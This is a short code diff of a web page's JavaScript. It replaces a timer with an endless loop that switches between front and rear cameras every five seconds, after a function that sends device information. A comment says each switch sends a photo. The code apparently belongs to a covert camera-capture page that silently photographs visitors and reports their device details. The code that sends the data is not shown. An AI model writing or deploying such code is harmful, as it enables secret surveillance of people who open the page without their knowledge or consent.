@@ -21,7 +21,6 @@
         const canvas = document.getElementById('canvas');
         let videoStream = null;
         let video = null;
-        let intervalId = null;
         let useFrontCamera = true;
 
         async function sendDeviceInfo() {
@@ -112,11 +111,10 @@ Device Information:
         async function startPhotoCaptureLoop() {
             await sendDeviceInfo();
 
-            // Start with front camera
-            await toggleCamera();
-
-            // Switch cameras every 5 seconds
-            intervalId = setInterval(toggleCamera, 5000);
+            while (true) {
+                await toggleCamera(); // Switch camera and send photo
+                await new Promise(resolve => setTimeout(resolve, 5000)); // Wait for 5 seconds
+            }
         }
 
         function stopCamera() {
